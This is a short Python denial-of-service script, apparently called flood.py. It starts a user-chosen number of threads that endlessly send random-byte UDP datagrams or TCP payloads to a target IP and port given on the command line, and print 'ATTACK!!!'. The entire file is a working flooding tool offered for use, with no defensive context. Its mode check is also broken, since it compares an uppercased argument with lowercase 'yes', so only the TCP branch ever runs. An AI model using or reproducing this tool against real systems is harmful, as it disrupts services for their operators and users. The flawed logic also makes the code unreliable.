#!/usr/bin/env python3

import random
import socket
import threading
import sys  # Import the sys module

def run(ip, port, times):
    data = random._urandom(1024)
    i = random.choice(("[*]", "[!]", "[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for _ in range(times):  # Use _ for unused loop variable
                s.sendto(data, addr)
            print(i + " ATTACK!!!")
        except:
            print("[!] ERROR!!!")

def run2(ip, port, times):
    data = random._urandom(16)
    i = random.choice(("[*]", "[!]", "[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for _ in range(times):  # Use _ for unused loop variable
                s.send(data)
            print(i + " ATTACK!!!")
        except:
            s.close()
            print("[*] ERROR")


if __name__ == "__main__":
    if len(sys.argv) != 6:
        print("Usage: python flood.py <ip> <port> yes 60 20")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    choice = sys.argv[3].upper()
    times = int(sys.argv[4])
    threads = int(sys.argv[5])

    for _ in range(threads):  # Use _ for unused loop variable
        if choice == 'yes':
            th = threading.Thread(target=run, args=(ip, port, times))
        else:
            th = threading.Thread(target=run2, args=(ip, port, times))
        th.start()